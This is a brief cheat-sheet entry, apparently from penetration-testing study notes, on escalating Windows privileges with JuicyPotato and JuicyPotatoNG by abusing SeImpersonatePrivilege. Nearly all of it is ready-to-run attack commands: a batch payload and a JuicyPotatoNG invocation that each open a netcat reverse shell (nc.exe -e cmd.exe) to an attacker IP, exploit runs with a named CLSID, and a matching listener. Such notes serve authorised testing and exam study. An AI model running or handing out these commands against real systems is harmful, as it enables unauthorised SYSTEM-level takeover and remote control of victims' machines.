---
title: JuicyPotato / JuicyPotatoNG
category: privesc
subcategory: windows-tokens
os: windows
command: .\JuicyPotato.exe -t * -p shell.bat -l 1337 -c "{CLSID}"
tools: JuicyPotato, JuicyPotatoNG
---


### Check privileges

```cmd
whoami /priv
systeminfo
```

Need `SeImpersonatePrivilege`.

### Pick CLSID for OS version

CLSIDs for the target OS at https://github.com/ohpe/juicy-potato/tree/master/CLSID/

### Prepare payload .bat

```cmd
echo C:\windows\temp\test\nc.exe -e cmd.exe 10.11.134.159 444 > test.bat
```

### Run JuicyPotato

```cmd
.\JuicyPotato.exe -l 1337 -t * -p test.bat
.\JuicyPotato.exe -t * -p shell.bat -l 444 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" 444
```

### JuicyPotatoNG variant

```cmd
.\JuicyPotatoNG.exe -t * -p nc.exe -a "192.168.45.165 4445 -e c:\windows\system32\cmd.exe"
```

### Listener

```bash
rlwrap nc -lvnp 444
```
